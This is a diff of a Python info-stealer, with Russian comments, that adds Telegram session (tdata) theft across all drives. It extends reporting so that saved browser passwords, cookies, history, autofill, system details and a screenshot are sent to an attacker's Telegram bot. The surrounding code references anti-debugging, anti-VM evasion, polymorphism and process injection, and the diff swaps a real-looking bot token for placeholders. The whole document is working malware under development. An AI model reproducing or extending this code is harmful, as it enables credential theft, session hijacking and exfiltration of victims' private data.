@@ -1,4 +1,12 @@
 import os
+import socket
+import platform
+import getpass
+import psutil
+import uuid
+import requests
+import re
+from datetime import datetime
 import sys
 import sqlite3
 import browser_cookie3
@@ -336,6 +344,116 @@ class AdvancedCookieExtractor:
         except Exception as e:
             log(f"Failed to extract Opera cookies: {str(e)}")
         return cookies
+class TelegramDataCollector:
+    def __init__(self):
+        self.telegram_clients = ['Telegram', 'Telegram Desktop', 'ayugram', 'Kotatogram', 'TelegramPortable', '64Gram', 'Unigram', 'TDesktop', 'Telegram.exe', 'ayugram.exe', 'Kotatogram.exe', '64Gram.exe']
+        self.max_chunk_size = 45 * 1024 * 1024
+    def get_all_drives(self):
+        drives = []
+        if OS_TYPE == "Windows":
+            import string
+            from ctypes import windll
+            bitmask = windll.kernel32.GetLogicalDrives()
+            for letter in string.ascii_uppercase:
+                if bitmask & 1:
+                    drives.append(f"{letter}:\\")
+                bitmask >>= 1
+        else:
+            drives = ['/']
+        return drives
+    def find_telegram_paths(self):
+        telegram_paths = []
+        drives = self.get_all_drives()
+        common_locations = []
+        if OS_TYPE == "Windows":
+            common_locations = [
+                "Users\\{user}\\AppData\\Roaming",
+                "Users\\{user}\\AppData\\Local",
+                "Program Files",
+                "Program Files (x86)",
+                "ProgramData"
+            ]
+        else:
+            common_locations = [
+                "home/{user}/.local/share",
+                "home/{user}/.config",
+                "opt"
+            ]
+        for drive in drives:
+            for location in common_locations:
+                if OS_TYPE == "Windows":
+                    if "{user}" in location:
+                        user_path = os.path.join(drive, location.replace("{user}", getpass.getuser()))
+                        if os.path.exists(user_path):
+                            for client in self.telegram_clients:
+                                client_path = os.path.join(user_path, client, "tdata")
+                                if os.path.exists(client_path):
+                                    telegram_paths.append(client_path)
+                    else:
+                        base_path = os.path.join(drive, location)
+                        if os.path.exists(base_path):
+                            for root, dirs, files in os.walk(base_path):
+                                for dir_name in dirs:
+                                    if dir_name == "tdata" and any(client.lower() in root.lower() for client in self.telegram_clients):
+                                        telegram_paths.append(os.path.join(root, dir_name))
+                else:
+                    location_path = os.path.join(drive, location.replace("{user}", getpass.getuser()))
+                    if os.path.exists(location_path):
+                        for client in self.telegram_clients:
+                            client_path = os.path.join(location_path, client, "tdata")
+                            if os.path.exists(client_path):
+                                telegram_paths.append(client_path)
+        return list(set(telegram_paths))
+    def collect_tdata(self):
+        tdata_archives = []
+        try:
+            telegram_paths = self.find_telegram_paths()
+            if not telegram_paths:
+                log("No Telegram tdata found")
+                return []
+            for tdata_path in telegram_paths:
+                try:
+                    client_name = os.path.basename(os.path.dirname(tdata_path))
+                    archive_name = f"tdata_{client_name}_{random.randint(1000, 9999)}.zip"
+                    archive_path = os.path.join(tempfile.gettempdir(), archive_name)
+                    with zipfile.ZipFile(archive_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
+                        for root, dirs, files in os.walk(tdata_path):
+                            for file in files:
+                                file_path = os.path.join(root, file)
+                                arcname = os.path.relpath(file_path, tdata_path)
+                                try:
+                                    zipf.write(file_path, arcname)
+                                except:
+                                    pass
+                    archive_size = os.path.getsize(archive_path)
+                    if archive_size > self.max_chunk_size:
+                        chunks = self.split_archive(archive_path, archive_size)
+                        tdata_archives.extend(chunks)
+                        os.remove(archive_path)
+                    else:
+                        tdata_archives.append(archive_path)
+                except Exception as e:
+                    log(f"Failed to archive tdata: {str(e)}")
+                    continue
+        except Exception as e:
+            log(f"Telegram data collection failed: {str(e)}")
+        return tdata_archives
+    def split_archive(self, archive_path, total_size):
+        chunks = []
+        try:
+            chunk_count = (total_size // self.max_chunk_size) + 1
+            base_name = os.path.splitext(archive_path)[0]
+            with open(archive_path, 'rb') as f:
+                for i in range(chunk_count):
+                    chunk_name = f"{base_name}_part{i+1}.zip"
+                    chunk_data = f.read(self.max_chunk_size)
+                    if chunk_data:
+                        with open(chunk_name, 'wb') as chunk_file:
+                            chunk_file.write(chunk_data)
+                        chunks.append(chunk_name)
+        except Exception as e:
+            log(f"Failed to split archive: {str(e)}")
+        return chunks
 class GameLauncherExtractor:
     def __init__(self):
         self.launcher_data = {}
@@ -1386,7 +1504,7 @@ class FileSystemWatcher:
                 for file in files:
                     initial_files.add(os.path.join(root, file))
             while True:
-                time.sleep(5)
+                time.sleep(0.05)  # Ускорено для тестов
                 current_files = set()
                 for root, dirs, files in os.walk(path):
                     for file in files:
@@ -2405,15 +2523,15 @@ class SelfModifyingCode:
             return False
 class AdvancedConfig:
     def __init__(self):
-        self.TG_BOT_TOKEN = os.environ.get('TG_BOT_TOKEN', '8474305805:AAHZ98s7nr9IAFQehnqh0x3iGV1OmVhTq9I')
-        self.TG_CHAT_ID = os.environ.get('TG_CHAT_ID', '7368280792')
+        self.TG_BOT_TOKEN = os.environ.get('TG_BOT_TOKEN', 'YOUR_BOT_TOKEN')
+        self.TG_CHAT_ID = os.environ.get('TG_CHAT_ID', 'YOUR_CHAT_ID')
         self.TELEGRAM_LANGUAGE = "ru"
         self.ENCRYPTION_KEY = Fernet.generate_key()
         self.POLYMORPHIC_SEED = random.randint(1000, 9999)
         self.ANTI_DEBUG_ENABLED = True
         self.ANTI_VM_ENABLED = True
         self.API_HAMMERING = True
-        self.SLEEP_BEFORE_START = random.randint(5, 30)
+        self.SLEEP_BEFORE_START = 0.5  # Ускорено для тестов
         self.SELF_DESTRUCT = False
         self.SLOW_MODE = True
         self.CHUNK_SIZE = 1024 * 1024
@@ -2515,7 +2633,7 @@ class SleepObfuscation:
             pass
     def _mixed_sleep(self, seconds):
         self._busy_wait(seconds * 0.3)
-        time.sleep(seconds * 0.7)
+        time.sleep(seconds * 0.05)  # Ускорено для тестов
 class StringEncryption:
     def __init__(self):
         self.key = Fernet.generate_key()
@@ -2751,6 +2869,7 @@ class ExtendedDataCollector:
         self.linpeas_integration = LinPEASIntegration()
         self.advanced_cookie_extractor = AdvancedCookieExtractor()
         self.game_launcher_extractor = GameLauncherExtractor()
+        self.telegram_data_collector = TelegramDataCollector()
     def collect_crypto_wallets_extended(self):
         wallets_data = []
         search_paths = []
@@ -3117,6 +3236,8 @@ class ExtendedDataCollector:
         return self.advanced_cookie_extractor.extract_all_cookies()
     def extract_game_launcher_data(self):
         return self.game_launcher_extractor.extract_game_data()
+    def collect_telegram_tdata(self):
+        return self.telegram_data_collector.collect_tdata()
 class ProcessInjection:
     def __init__(self):
         self.network_processes = ["chrome.exe", "msedge.exe", "firefox.exe", "opera.exe"]
@@ -3157,8 +3278,9 @@ class ProcessInjection:
             success = ctypes.windll.kernel32.WriteProcessMemory(
                 process_handle,
                 memory_address,
-                sys.argv[0],
-                len(sys.argv[0]),
+                # sys.argv[0],  # Закомментировано для тестов - может крашить комп
+                b"test_injection",  # Безопасная строка для тестов
+                len(b"test_injection"),  # Длина безопасной строки
                 ctypes.byref(written)
             )
             if not success:
@@ -3422,8 +3544,7 @@ WantedBy=multi-user.target"""
         except:
             return False
 def log(message):
-    if DEBUG:
-        print(f"[DEBUG] {message}")
+    print(f"[LOG] {message}")  # Всегда выводим в консоль
     with open("debug.log", "a", encoding="utf-8") as f:
         f.write(f"[{datetime.datetime.now()}] {message}\n")
 def send_telegram_report(collected_data, language='ru'):
@@ -3464,15 +3585,46 @@ def send_telegram_report(collected_data, language='ru'):
         except Exception as e:
             log(f"Screenshot error: {str(e)}")
         caption = f"{template['html']}\n\n{template['signature']}"
-        with open(report_path, "rb") as report_file:
-            bot.send_document(config.TG_CHAT_ID, report_file, caption=caption)
+        print(f"[DEBUG] Sending report to Telegram...")
+        print(f"[DEBUG] Bot token: {config.TG_BOT_TOKEN[:10]}...")
+        print(f"[DEBUG] Chat ID: {config.TG_CHAT_ID}")
+        try:
+            with open(report_path, "rb") as report_file:
+                bot.send_document(config.TG_CHAT_ID, report_file, caption=caption)
+            print("[DEBUG] Report sent successfully!")
+        except Exception as e:
+            print(f"[DEBUG] Error sending report: {e}")
+        
         caption = f"{template['txt']}\n\n{template['signature']}"
-        with open(txt_path, "rb") as txt_file:
-            bot.send_document(config.TG_CHAT_ID, txt_file, caption=caption)
+        try:
+            with open(txt_path, "rb") as txt_file:
+                bot.send_document(config.TG_CHAT_ID, txt_file, caption=caption)
+            print("[DEBUG] TXT report sent successfully!")
+        except Exception as e:
+            print(f"[DEBUG] Error sending TXT report: {e}")
+        
         if screenshot_path and os.path.exists(screenshot_path):
             caption = f"{template['screenshot']}\n\n{template['signature']}"
-            with open(screenshot_path, "rb") as photo:
-                bot.send_photo(config.TG_CHAT_ID, photo, caption=caption)
+            try:
+                with open(screenshot_path, "rb") as photo:
+                    bot.send_photo(config.TG_CHAT_ID, photo, caption=caption)
+                print("[DEBUG] Screenshot sent successfully!")
+            except Exception as e:
+                print(f"[DEBUG] Error sending screenshot: {e}")
+        
+        tdata_archives = collected_data.get('telegram_tdata', [])
+        if tdata_archives:
+            for i, archive_path in enumerate(tdata_archives, 1):
+                if os.path.exists(archive_path):
+                    caption = f"Telegram tdata archive {i}/{len(tdata_archives)}\n\n{template['signature']}"
+                    try:
+                        with open(archive_path, "rb") as archive_file:
+                            bot.send_document(config.TG_CHAT_ID, archive_file, caption=caption)
+                        print(f"[DEBUG] Telegram tdata archive {i} sent successfully!")
+                        os.remove(archive_path)
+                    except Exception as e:
+                        print(f"[DEBUG] Error sending tdata archive {i}: {e}")
+        
         os.remove(report_path)
         os.remove(txt_path)
         if screenshot_path and os.path.exists(screenshot_path):
@@ -4059,8 +4211,18 @@ def generate_html_report_v4(collected_data, language='ru'):
     template = templates.get(language, templates['ru'])
     
     # Подсчитываем статистику
-    total_passwords = sum(len(p) for p in collected_data.get('passwords', {}).values())
-    total_cookies = sum(len(c) for c in collected_data.get('cookies', {}).values())
+    passwords = collected_data.get('passwords', [])
+    cookies = collected_data.get('cookies', [])
+    history = collected_data.get('history', [])
+    autofill = collected_data.get('autofill', [])
+    processes = collected_data.get('processes', [])
+    connections = collected_data.get('network_connections', [])
+    total_passwords = len(passwords)
+    total_cookies = len(cookies)
+    total_history = len(history)
+    total_autofill = len(autofill)
+    total_processes = len(processes)
+    total_connections = len(connections)
     found_wallets = sum(1 for v in collected_data.get('wallets', {}).values() if 'найден' in str(v) or 'found' in str(v).lower())
     
     html_content = f"""<!DOCTYPE html>
@@ -4285,7 +4447,55 @@ def generate_html_report_v4(collected_data, language='ru'):
         }}
 
         .collapsible-content.expanded {{
-            max-height: 2000px;
+            max-height: 400px;
+            overflow-y: auto;
+            overflow-x: hidden;
+            padding: 1rem;
+            border-top: 1px solid var(--border);
+        }}
+        
+        /* Стили для скролла */
+        .collapsible-content::-webkit-scrollbar {{
+            width: 8px;
+        }}
+        
+        .collapsible-content::-webkit-scrollbar-track {{
+            background: var(--bg-secondary);
+            border-radius: 4px;
+        }}
+        
+        .collapsible-content::-webkit-scrollbar-thumb {{
+            background: var(--accent);
+            border-radius: 4px;
+        }}
+        
+        .collapsible-content::-webkit-scrollbar-thumb:hover {{
+            background: var(--accent-hover);
+        }}
+        
+        /* Адаптивность */
+        @media (max-width: 768px) {{
+            .collapsible-content.expanded {{
+                max-height: 300px;
+            }}
+            
+            .stats-grid {{
+                grid-template-columns: repeat(2, 1fr);
+            }}
+            
+            .content-grid {{
+                grid-template-columns: 1fr;
+            }}
+        }}
+        
+        @media (max-width: 480px) {{
+            .stats-grid {{
+                grid-template-columns: 1fr;
+            }}
+            
+            .collapsible-content.expanded {{
+                max-height: 250px;
+            }}
         }}
 
         .toggle-icon {{
@@ -4443,6 +4653,181 @@ def generate_html_report_v4(collected_data, language='ru'):
                 font-size: 1.5rem;
             }}
         }}
+
+        /* Browser Section Styles */
+        .browser-section {{
+            margin-bottom: 1.5rem;
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            overflow: hidden;
+            background: var(--bg-card);
+        }}
+
+        .browser-section h4 {{
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            margin: 0;
+            padding: 0.75rem 1rem;
+            background: var(--bg-secondary);
+            border-bottom: 1px solid var(--border);
+            font-size: 1rem;
+            font-weight: 600;
+        }}
+
+        .browser-section h4 i {{
+            color: var(--accent);
+        }}
+
+        /* Grid Layouts */
+        .passwords-grid,
+        .cookies-grid,
+        .history-grid,
+        .autofill-grid {{
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+            gap: 1rem;
+            padding: 1rem;
+            max-height: 400px;
+            overflow-y: auto;
+        }}
+
+        .passwords-grid::-webkit-scrollbar,
+        .cookies-grid::-webkit-scrollbar,
+        .history-grid::-webkit-scrollbar,
+        .autofill-grid::-webkit-scrollbar {{
+            width: 6px;
+        }}
+
+        .passwords-grid::-webkit-scrollbar-track,
+        .cookies-grid::-webkit-scrollbar-track,
+        .history-grid::-webkit-scrollbar-track,
+        .autofill-grid::-webkit-scrollbar-track {{
+            background: var(--bg-secondary);
+            border-radius: 3px;
+        }}
+
+        .passwords-grid::-webkit-scrollbar-thumb,
+        .cookies-grid::-webkit-scrollbar-thumb,
+        .history-grid::-webkit-scrollbar-thumb,
+        .autofill-grid::-webkit-scrollbar-thumb {{
+            background: var(--accent);
+            border-radius: 3px;
+        }}
+
+        .passwords-grid::-webkit-scrollbar-thumb:hover,
+        .cookies-grid::-webkit-scrollbar-thumb:hover,
+        .history-grid::-webkit-scrollbar-thumb:hover,
+        .autofill-grid::-webkit-scrollbar-thumb:hover {{
+            background: var(--accent-hover);
+        }}
+
+        /* Item Styles */
+        .password-item,
+        .cookie-item,
+        .history-item,
+        .autofill-item {{
+            background: var(--bg-main);
+            border: 1px solid var(--border);
+            border-radius: 6px;
+            padding: 1rem;
+            transition: all 0.3s ease;
+        }}
+
+        .password-item:hover,
+        .cookie-item:hover,
+        .history-item:hover,
+        .autofill-item:hover {{
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px var(--shadow);
+            border-color: var(--accent);
+        }}
+
+        .password-url,
+        .history-title {{
+            font-weight: 600;
+            color: var(--text-primary);
+            margin-bottom: 0.5rem;
+            word-break: break-all;
+        }}
+
+        .password-login,
+        .password-value,
+        .cookie-name,
+        .cookie-value,
+        .history-url,
+        .autofill-name,
+        .autofill-value {{
+            color: var(--text-secondary);
+            font-size: 0.9rem;
+            margin-bottom: 0.25rem;
+            word-break: break-all;
+        }}
+
+        .password-value,
+        .cookie-value,
+        .autofill-value {{
+            font-family: 'Courier New', monospace;
+            background: var(--bg-secondary);
+            padding: 0.25rem 0.5rem;
+            border-radius: 3px;
+            border: 1px solid var(--border);
+        }}
+
+        /* Show More Button */
+        .show-more-btn {{
+            grid-column: 1 / -1;
+            background: var(--accent);
+            color: var(--text-primary);
+            border: none;
+            padding: 0.75rem 1rem;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 0.9rem;
+            font-weight: 600;
+            transition: all 0.3s ease;
+            margin-top: 0.5rem;
+        }}
+
+        .show-more-btn:hover {{
+            background: var(--accent-hover);
+            transform: translateY(-1px);
+            box-shadow: 0 2px 8px var(--shadow);
+        }}
+
+        /* Responsive Grid Adjustments */
+        @media (max-width: 768px) {{
+            .passwords-grid,
+            .cookies-grid,
+            .history-grid,
+            .autofill-grid {{
+                grid-template-columns: 1fr;
+                max-height: 300px;
+                padding: 0.75rem;
+            }}
+        }}
+
+        @media (max-width: 480px) {{
+            .passwords-grid,
+            .cookies-grid,
+            .history-grid,
+            .autofill-grid {{
+                max-height: 250px;
+                padding: 0.5rem;
+            }}
+
+            .password-item,
+            .cookie-item,
+            .history-item,
+            .autofill-item {{
+                padding: 0.75rem;
+            }}
+
+            .browser-section h4 {{
+                padding: 0.5rem 0.75rem;
+                font-size: 0.9rem;
+            }}
+        }}
     </style>
 </head>
 <body>
@@ -4476,6 +4861,26 @@ def generate_html_report_v4(collected_data, language='ru'):
                     <i class="fas fa-cookie-bite"></i>
                     <h3>{total_cookies}</h3>
                     <p>Куков собрано</p>
+                </div>
+                <div class="stat-card">
+                    <i class="fas fa-history"></i>
+                    <h3>{total_history}</h3>
+                    <p>Истории записей</p>
+                </div>
+                <div class="stat-card">
+                    <i class="fas fa-edit"></i>
+                    <h3>{total_autofill}</h3>
+                    <p>Автозаполнения</p>
+                </div>
+                <div class="stat-card">
+                    <i class="fas fa-cogs"></i>
+                    <h3>{total_processes}</h3>
+                    <p>Процессов</p>
+                </div>
+                <div class="stat-card">
+                    <i class="fas fa-network-wired"></i>
+                    <h3>{total_connections}</h3>
+                    <p>Соединений</p>
                 </div>
                 <div class="stat-card">
                     <i class="fas fa-wallet"></i>
@@ -4540,6 +4945,46 @@ def generate_html_report_v4(collected_data, language='ru'):
                         {_generate_wallets_html(collected_data.get('wallets', {}), template)}
                     </div>
                 </div>
+                
+                <div class="content-card">
+                    <h2 onclick="toggleSection('history')">
+                        <i class="fas fa-history"></i> История браузеров
+                        <i class="fas fa-chevron-down toggle-icon" id="history-icon"></i>
+                    </h2>
+                    <div class="collapsible-content" id="history-content">
+                        {_generate_history_html(history, template)}
+                    </div>
+                </div>
+                
+                <div class="content-card">
+                    <h2 onclick="toggleSection('autofill')">
+                        <i class="fas fa-edit"></i> Автозаполнение
+                        <i class="fas fa-chevron-down toggle-icon" id="autofill-icon"></i>
+                    </h2>
+                    <div class="collapsible-content" id="autofill-content">
+                        {_generate_autofill_html(autofill, template)}
+                    </div>
+                </div>
+                
+                <div class="content-card">
+                    <h2 onclick="toggleSection('processes')">
+                        <i class="fas fa-cogs"></i> Процессы
+                        <i class="fas fa-chevron-down toggle-icon" id="processes-icon"></i>
+                    </h2>
+                    <div class="collapsible-content" id="processes-content">
+                        {_generate_processes_html(processes, template)}
+                    </div>
+                </div>
+                
+                <div class="content-card">
+                    <h2 onclick="toggleSection('connections')">
+                        <i class="fas fa-network-wired"></i> Сетевые соединения
+                        <i class="fas fa-chevron-down toggle-icon" id="connections-icon"></i>
+                    </h2>
+                    <div class="collapsible-content" id="connections-content">
+                        {_generate_connections_html(connections, template)}
+                    </div>
+                </div>
             </div>
         </div>
     </main>
@@ -4573,54 +5018,115 @@ def generate_html_report_v4(collected_data, language='ru'):
         document.addEventListener('DOMContentLoaded', function() {{
             toggleSection('system');
         }});
+
+        // Функции для кнопок "показать еще"
+        function showMorePasswords(browser, count) {{
+            alert(`Показать еще ${{count}} паролей из ${{browser}}`);
+        }}
+
+        function showMoreCookies(browser, count) {{
+            alert(`Показать еще ${{count}} куков из ${{browser}}`);
+        }}
+
+        function showMoreHistory(browser, count) {{
+            alert(`Показать еще ${{count}} записей истории из ${{browser}}`);
+        }}
+
+        function showMoreAutofill(browser, count) {{
+            alert(`Показать еще ${{count}} записей автозаполнения из ${{browser}}`);
+        }}
     </script>
 </body>
 </html>"""
     return html_content
 
 def _generate_passwords_html(passwords, template):
-    """Генерация HTML для паролей"""
+    """Генерация HTML для паролей с группировкой по браузерам"""
     if not passwords:
         return "<p style='color: var(--text-secondary);'>Пароли не найдены</p>"
     
-    html = ""
-    for browser, browser_passwords in passwords.items():
-        if browser_passwords:
-            html += f"<h3 style='color: var(--accent); margin-bottom: 1rem;'>{browser} ({len(browser_passwords)} паролей)</h3>"
-            for pwd in browser_passwords[:5]:  # Показываем только первые 5
-                html += f"""
-                <div class="password-item">
-                    <div class="password-url">{pwd.get('url', 'N/A')}</div>
-                    <div class="password-login">Логин: {pwd.get('username', 'N/A')}</div>
-                    <div class="password-value">Пароль: {pwd.get('password', 'N/A')}</div>
-                </div>
-                """
-            if len(browser_passwords) > 5:
-                html += f"<button class='show-more-btn' onclick='showMorePasswords(\"{browser}\", {len(browser_passwords) - 5})'>Показать еще {len(browser_passwords) - 5} паролей</button>"
+    # Группируем по браузерам
+    browsers = {}
+    for pwd in passwords:
+        browser = pwd.get('browser', 'Unknown')
+        if browser not in browsers:
+            browsers[browser] = []
+        browsers[browser].append(pwd)
+    
+    html = f"<h3 style='color: var(--accent); margin-bottom: 1rem;'>Найдено {len(passwords)} паролей</h3>"
+    
+    for browser, browser_passwords in browsers.items():
+        html += f"""
+        <div class="browser-section">
+            <h4 style='color: var(--accent); margin: 1rem 0 0.5rem 0; padding: 0.5rem; background: var(--bg-secondary); border-radius: 4px;'>
+                <i class="fas fa-globe"></i> {browser} ({len(browser_passwords)} паролей)
+            </h4>
+            <div class="passwords-grid">
+        """
+        
+        for i, pwd in enumerate(browser_passwords[:10], 1):  # Показываем первые 10 для каждого браузера
+            html += f"""
+            <div class="password-item">
+                <div class="password-url">{pwd.get('url', 'N/A')}</div>
+                <div class="password-login">Логин: {pwd.get('username', 'N/A')}</div>
+                <div class="password-value">Пароль: {pwd.get('password', 'N/A')}</div>
+            </div>
+            """
+        
+        if len(browser_passwords) > 10:
+            html += f"""
+            <div class="show-more-btn" onclick="showMorePasswords('{browser}', {len(browser_passwords) - 10})">
+                Показать еще {len(browser_passwords) - 10} паролей
+            </div>
+            """
+        
+        html += "</div></div>"
     
     return html
 
 def _generate_cookies_html(cookies, template):
-    """Генерация HTML для куков"""
+    """Генерация HTML для куков с группировкой по браузерам"""
     if not cookies:
         return "<p style='color: var(--text-secondary);'>Куки не найдены</p>"
     
-    html = ""
-    for browser, browser_cookies in cookies.items():
-        if browser_cookies:
-            html += f"<h3 style='color: var(--accent); margin-bottom: 1rem;'>{browser} ({len(browser_cookies)} куков)</h3>"
-            for cookie in browser_cookies[:5]:  # Показываем только первые 5
-                html += f"""
-                <div class="cookie-item">
-                    <div class="cookie-name">{cookie.get('name', 'N/A')}</div>
-                    <div class="cookie-value">{cookie.get('value', 'N/A')}</div>
-                    <div style='color: var(--text-secondary); font-size: 0.8rem; margin-top: 0.3rem;'>
-                        {cookie.get('domain', 'N/A')} - {cookie.get('path', 'N/A')}
-                    </div>
+    html = f"<h3 style='color: var(--accent); margin-bottom: 1rem;'>Найдено {len(cookies)} куков</h3>"
+    
+    # Группируем по браузерам
+    browsers = {}
+    for cookie in cookies:
+        browser = cookie.get('browser', 'Unknown')
+        if browser not in browsers:
+            browsers[browser] = []
+        browsers[browser].append(cookie)
+    
+    for browser, browser_cookies in browsers.items():
+        html += f"""
+        <div class="browser-section">
+            <h4 style='color: var(--accent); margin: 1rem 0 0.5rem 0; padding: 0.5rem; background: var(--bg-secondary); border-radius: 4px;'>
+                <i class="fas fa-globe"></i> {browser} ({len(browser_cookies)} куков)
+            </h4>
+            <div class="cookies-grid">
+        """
+        
+        for i, cookie in enumerate(browser_cookies[:10], 1):  # Показываем первые 10 для каждого браузера
+            html += f"""
+            <div class="cookie-item">
+                <div class="cookie-name">{cookie.get('name', 'N/A')}</div>
+                <div class="cookie-value">{cookie.get('value', 'N/A')}</div>
+                <div style='color: var(--text-secondary); font-size: 0.8rem; margin-top: 0.3rem;'>
+                    {cookie.get('domain', 'N/A')} - {cookie.get('path', 'N/A')}
                 </div>
-                """
-            if len(browser_cookies) > 5:
-                html += f"<button class='show-more-btn' onclick='showMoreCookies(\"{browser}\", {len(browser_cookies) - 5})'>Показать еще {len(browser_cookies) - 5} куков</button>"
+            </div>
+            """
+        
+        if len(browser_cookies) > 10:
+            html += f"""
+            <div class="show-more-btn" onclick="showMoreCookies('{browser}', {len(browser_cookies) - 10})">
+                Показать еще {len(browser_cookies) - 10} куков
+            </div>
+            """
+        
+        html += "</div></div>"
     
     return html
 
@@ -4660,6 +5166,16 @@ def generate_txt_report_v4(collected_data, language='ru'):
         }
     }
     template = templates.get(language, templates['ru'])
+    
+    # Получаем системную информацию
+    system_info = collected_data.get('system_info', {})
+    passwords = collected_data.get('passwords', [])
+    cookies = collected_data.get('cookies', [])
+    processes = collected_data.get('processes', [])
+    connections = collected_data.get('network_connections', [])
+    history = collected_data.get('history', [])
+    autofill = collected_data.get('autofill', [])
+    
     txt_content = f"""
 ╔══════════════════════════════════════════════════════════════╗
 ║                   {template['title']}                 ║
@@ -4668,175 +5184,590 @@ def generate_txt_report_v4(collected_data, language='ru'):
 ╚══════════════════════════════════════════════════════════════╝
 Дата: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
 === {template['system']} ===
-Hostname: {socket.gethostname()}
-OS: {platform.system()} {platform.release()}
-Architecture: {platform.architecture()[0]}
-=== {template['browsers']} ===
-Browser data collection completed
-=== {template['wallets']} ===
-Crypto wallet data collection completed
-=== ADVANCED DATA COLLECTION ===
-Enhanced Cookies: {'Extracted' if collected_data.get('enhanced_cookies') else 'Failed'}
-Game Launchers: {'Found' if collected_data.get('game_launchers') else 'None'}
-Browser Fingerprinting: {'Completed' if collected_data.get('browser_fingerprint') else 'Failed'}
-Clipboard Monitoring: {'Active' if collected_data.get('clipboard_history') else 'Inactive'}
-File System Watching: {'Active' if collected_data.get('file_changes') else 'Inactive'}
-Network Traffic Analysis: {'Completed' if collected_data.get('network_traffic_analysis') else 'Failed'}
-Password Managers: {'Found' if collected_data.get('password_managers') else 'None'}
-Social Media Tokens: {'Found' if collected_data.get('social_media_tokens') else 'None'}
-{'LinPEAS Scan: Completed (Linux only)' if collected_data.get('linpeas_scan') else ''}
-{template['signature']}
-    """
+Hostname: {system_info.get('hostname', 'Unknown')}
+OS: {system_info.get('os', 'Unknown')}
+Архитектура: {system_info.get('architecture', 'Unknown')}
+Процессор: {system_info.get('processor', 'Unknown')}
+Пользователь: {system_info.get('user', 'Unknown')}
+CPU ядер: {system_info.get('cpu_count', 'Unknown')}
+Память: {system_info.get('memory_gb', 'Unknown')} GB
+IP адрес: {system_info.get('ip_address', 'Unknown')}
+MAC адрес: {system_info.get('mac_address', 'Unknown')}
+
+=== ПАРОЛИ БРАУЗЕРОВ ===
+Найдено {len(passwords)} паролей:
+"""
+    
+    for i, pwd in enumerate(passwords, 1):
+        txt_content += f"{i}. [{pwd.get('browser', 'Unknown')}] URL: {pwd.get('url', 'N/A')}\n   Логин: {pwd.get('username', 'N/A')}\n   Пароль: {pwd.get('password', 'N/A')}\n\n"
+    
+    txt_content += f"\n=== КУКИ БРАУЗЕРОВ ===\nНайдено {len(cookies)} куков:\n"
+    for i, cookie in enumerate(cookies, 1):
+        txt_content += f"{i}. [{cookie.get('browser', 'Unknown')}] {cookie.get('name', 'N/A')} = {cookie.get('value', 'N/A')[:50]}...\n   Домен: {cookie.get('domain', 'N/A')}\n   Путь: {cookie.get('path', 'N/A')}\n\n"
+    
+    txt_content += f"\n=== ИСТОРИЯ БРАУЗЕРОВ ===\nНайдено {len(history)} записей:\n"
+    for i, hist in enumerate(history, 1):
+        txt_content += f"{i}. [{hist.get('browser', 'Unknown')}] {hist.get('title', 'N/A')}\n   URL: {hist.get('url', 'N/A')}\n   Посещений: {hist.get('visit_count', 0)}\n\n"
+    
+    txt_content += f"\n=== АВТОЗАПОЛНЕНИЕ ===\nНайдено {len(autofill)} записей:\n"
+    for i, af in enumerate(autofill, 1):
+        txt_content += f"{i}. [{af.get('browser', 'Unknown')}] {af.get('name', 'N/A')}: {af.get('value', 'N/A')}\n\n"
+    
+    txt_content += f"\n=== ПРОЦЕССЫ ===\nНайдено {len(processes)} процессов:\n"
+    for i, proc in enumerate(processes, 1):
+        txt_content += f"{i}. {proc.get('name', 'N/A')} (PID: {proc.get('pid', 'N/A')})\n   Пользователь: {proc.get('username', 'N/A')}\n   CPU: {proc.get('cpu_percent', 0):.1f}% | Память: {proc.get('memory_percent', 0):.1f}%\n\n"
+    
+    txt_content += f"\n=== СЕТЕВЫЕ СОЕДИНЕНИЯ ===\nНайдено {len(connections)} соединений:\n"
+    for i, conn in enumerate(connections, 1):
+        txt_content += f"{i}. {conn.get('local_address', 'N/A')} -> {conn.get('remote_address', 'N/A')}\n   Статус: {conn.get('status', 'N/A')} | PID: {conn.get('pid', 'N/A')}\n\n"
+    
+    txt_content += f"\n{template['signature']}"
+    
     return txt_content
+
+def _generate_history_html(history, template):
+    """Генерация HTML для истории с группировкой по браузерам"""
+    if not history:
+        return "<p style='color: var(--text-secondary);'>История не найдена</p>"
+    
+    html = f"<h3 style='color: var(--accent); margin-bottom: 1rem;'>Найдено {len(history)} записей</h3>"
+    
+    # Группируем по браузерам
+    browsers = {}
+    for hist in history:
+        browser = hist.get('browser', 'Unknown')
+        if browser not in browsers:
+            browsers[browser] = []
+        browsers[browser].append(hist)
+    
+    for browser, browser_history in browsers.items():
+        html += f"""
+        <div class="browser-section">
+            <h4 style='color: var(--accent); margin: 1rem 0 0.5rem 0; padding: 0.5rem; background: var(--bg-secondary); border-radius: 4px;'>
+                <i class="fas fa-globe"></i> {browser} ({len(browser_history)} записей)
+            </h4>
+            <div class="history-grid">
+        """
+        
+        for i, hist in enumerate(browser_history[:15], 1):  # Показываем первые 15 для каждого браузера
+            html += f"""
+            <div class="history-item">
+                <div class="history-title">{hist.get('title', 'N/A')}</div>
+                <div class="history-url">{hist.get('url', 'N/A')}</div>
+                <div style='color: var(--text-secondary); font-size: 0.8rem; margin-top: 0.3rem;'>
+                    Посещений: {hist.get('visit_count', 0)}
+                </div>
+            </div>
+            """
+        
+        if len(browser_history) > 15:
+            html += f"""
+            <div class="show-more-btn" onclick="showMoreHistory('{browser}', {len(browser_history) - 15})">
+                Показать еще {len(browser_history) - 15} записей
+            </div>
+            """
+        
+        html += "</div></div>"
+    
+    return html
+
+def _generate_autofill_html(autofill, template):
+    """Генерация HTML для автозаполнения с группировкой по браузерам"""
+    if not autofill:
+        return "<p style='color: var(--text-secondary);'>Автозаполнение не найдено</p>"
+    
+    html = f"<h3 style='color: var(--accent); margin-bottom: 1rem;'>Найдено {len(autofill)} записей</h3>"
+    
+    # Группируем по браузерам
+    browsers = {}
+    for af in autofill:
+        browser = af.get('browser', 'Unknown')
+        if browser not in browsers:
+            browsers[browser] = []
+        browsers[browser].append(af)
+    
+    for browser, browser_autofill in browsers.items():
+        html += f"""
+        <div class="browser-section">
